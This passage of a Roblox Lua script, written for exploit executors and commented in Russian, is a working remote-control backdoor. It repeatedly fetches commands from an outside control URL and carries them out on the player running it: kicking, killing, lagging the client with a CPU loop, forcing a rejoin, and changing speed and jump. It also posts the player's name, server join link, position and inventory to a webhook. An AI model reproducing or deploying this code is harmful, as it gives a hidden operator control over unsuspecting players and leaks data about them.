local function requestFunc(options)
    local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
    if fn then return fn(options) end
end

local function getInventory()
    local tools = {}
    pcall(function()
        for _, v in ipairs(lp.Backpack:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name) end end
        if lp.Character then for _, v in ipairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (E)") end end end
    end)
    return #tools > 0 and table.concat(tools, ", ") or "Empty"
end

-- Обновленная функция лога (синхронная по необходимости)
local function sendLog(title, desc, color, wait_for_finish)
    local function execute()
        local pos = "Unknown"
        pcall(function() 
            if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then 
                local p = lp.Character.HumanoidRootPart.Position; 
                pos = string.format("%.1f, %.1f, %.1f", p.X, p.Y, p.Z) 
            end 
        end)
        
        local gameName = "Unknown"
        pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
        local joinUrl = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId

        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0xFF0000,
                ["fields"] = {
                    {["name"] = "👤 Игрок", ["value"] = "`"..lp.Name.."`", ["inline"] = true},
                    {["name"] = "🎮 Игра", ["value"] = "["..gameName.."]("..joinUrl..")", ["inline"] = true},
                    {["name"] = "📍 Позиция", ["value"] = "`"..pos.."`", ["inline"] = true},
                    {["name"] = "🎒 Инвентарь", ["value"] = "```"..getInventory().."```", ["inline"] = false}
                },
                ["footer"] = {["text"] = "AxM Fixed v40.5 • "..os.date("%X")}
            }}
        }
        return requestFunc({Url = settings.webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end

    if wait_for_finish then
        execute() -- Выполняем в основном потоке, чтобы дождаться отправки
    else
        task.spawn(execute)
    end
end

local current_config = {
    speed = 16,
    jump = 50,
    active_effects = {},
    lagging = false
}

-- Исправление WalkSpeed/JumpPower (постоянная проверка)
task.spawn(function()
    while true do
        task.wait(0.5)
        local char = lp.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            if hum.WalkSpeed ~= current_config.speed then hum.WalkSpeed = current_config.speed end
            if current_config.jump > 50 then hum.JumpPower = current_config.jump; hum.UseJumpPower = true end
        end
    end
end)

task.spawn(function()
    local last_cmd = ""
    while true do
        local ok, res = pcall(function() 
            return game:HttpGet(settings.control.."?cb="..tick()) 
        end)

        if ok and res then
            local clean_res = res:match("^%s*(.-)%s*$") or ""
            local current_cmd = clean_res:lower()

            if current_cmd ~= "safe" and current_cmd ~= "" and current_cmd ~= last_cmd then
                last_cmd = current_cmd
                
                -- Логируем ДО исполнения
                if current_cmd:find("kick") then
                    local reason = clean_res:match("%((.-)%)") or "Disconnected"
                    sendLog("🚪 KICKED", "Reason: "..reason, 0xFF4500, true)
                    task.wait(0.5)
                    lp:Kick(reason)
                elseif current_cmd == "kill" then
                    sendLog("💀 KILL", "Execution started", 0xFF0000, true)
                    if lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") then
                        lp.Character:FindFirstChildOfClass("Humanoid").Health = 0
                    end
                elseif current_cmd:find("speed") then
                    local val = tonumber(clean_res:match("%((%d+)%)")) or 16
                    current_config.speed = val
                    sendLog("⚡ SPEED", "Value: "..val, 0x00FFFF)
                elseif current_cmd:find("jump") then
                    local val = tonumber(clean_res:match("%((%d+)%)")) or 50
                    current_config.jump = val
                    sendLog("🚀 JUMP", "Value: "..val, 0x00FFFF)
                elseif current_cmd == "lag" then
                    current_config.lagging = true
                    sendLog("📶 LAG", "Lag machine active", 0x7F8C8D)
                    task.spawn(function()
                        while current_config.lagging do
                            for i=1, 100000 do local _ = math.sqrt(i) end
                            RunService.Heartbeat:Wait()
                        end
                    end)
                elseif current_cmd == "unlag" then
                    current_config.lagging = false
                    sendLog("📶 UNLAG", "System cleaned")
                elseif current_cmd == "rejoin" then
                    sendLog("🔄 REJOIN", "Reconnecting to server...", 0x2ECC71, true)
                    task.wait(0.5)
                    TeleportService:Teleport(game.PlaceId, lp)
                end
            elseif current_cmd == "safe" then
                last_cmd = "safe"
            end
        end
        task.wait(settings.check_delay)
    end
end)

